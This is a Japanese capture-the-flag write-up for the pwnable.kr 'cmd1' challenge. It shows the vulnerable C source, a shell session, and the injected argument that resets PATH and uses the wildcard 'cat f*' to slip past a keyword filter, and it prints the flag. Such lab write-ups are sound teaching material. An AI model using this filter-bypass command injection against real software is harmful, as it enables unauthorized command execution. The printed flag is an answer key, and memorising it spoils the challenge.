# 内容
まずはsshでログインしてみる

```bash
sh cmd1@pwnable.kr -p2222
cmd1@pwnable.kr's password:
 ____  __    __  ____    ____  ____   _        ___      __  _  ____
|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \
|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  )
|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    /
|  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \
|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|

- Site admin : daehee87.kr@gmail.com
- IRC : irc.netgarage.org:6667 / #pwnable.kr
- Simply type "irssi" command to join IRC now
- files under /tmp can be erased anytime. make your directory under /tmp
- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
Last login: Mon Jul 29 20:49:49 2019 from 217.117.125.72
cmd1@prowl:~$ ls
cmd1  cmd1.c  flag
cmd1@prowl:~$ ./cmd1
Segmentation fault (core dumped)
cmd1@prowl:~$ cat cmd1.c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
        int r=0;
        r += strstr(cmd, "flag")!=0;
        r += strstr(cmd, "sh")!=0;
        r += strstr(cmd, "tmp")!=0;
        return r;
}
int main(int argc, char* argv[], char** envp){
        putenv("PATH=/thankyouverymuch");
        if(filter(argv[1])) return 0;
        system( argv[1] );
        return 0;
}

cmd1@prowl:~$ ./cmd1
Segmentation fault (core dumped)
cmd1@prowl:~$ ./cmd1 flag
cmd1@prowl:~$ ./cmd1 sh
cmd1@prowl:~$ ./cmd1 a
sh: 1: a: not found
cmd1@prowl:~$ ./cmd1 ls
sh: 1: ls: not found
cmd1@prowl:~$ ls
cmd1  cmd1.c  flag
cmd1@prowl:~$ ls /tm
ls: cannot access '/tm': No such file or directory
cmd1@prowl:~$ ls /tmp
ls: cannot open directory '/tmp': Permission denied
cmd1@prowl:~$ ls -la
total 40
drwxr-x---   5 root cmd1     4096 Mar 23  2018 .
drwxr-xr-x 114 root root     4096 May 19 15:59 ..
d---------   2 root root     4096 Jul 12  2015 .bash_history
-r-xr-sr-x   1 root cmd1_pwn 8513 Jul 14  2015 cmd1
-rw-r--r--   1 root root      320 Mar 23  2018 cmd1.c
-r--r-----   1 root cmd1_pwn   48 Jul 14  2015 flag
dr-xr-xr-x   2 root root     4096 Jul 22  2015 .irssi
drwxr-xr-x   2 root root     4096 Oct 23  2016 .pwntools-cache
```

環境変数がpathで上書きされているので、何のコマンドも打てない状態になっている。
なので、環境変数を上書きすればよい。

# 解答
各単語、flag, sh, tmpを用いず、flagをゲットすれば良い。
と、考えていたんだが、どうもうまくいかない・・・。

```bash
cmd1@prowl:~$ ./cmd1 "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin; for i in `find`; do cat $i ; done"
find: ‘./.bash_history’: Permission denied
cmd1@prowl:~$
cmd1@prowl:~$
cmd1@prowl:~$ ./cmd1 "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin; for i in `ls`; do cat $i ; done"
```

特にフィルターにかかる文字hあ使っていない気がするんだけど、なぜなんでしょ・・・。
色々考えた結果、これが一番良いことに気づいた。

```bash
cmd1@prowl:~$ ./cmd1 "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin;  cat f*"
mommy now I get what PATH environment is for :)
```

フラグゲット                                                                                                    
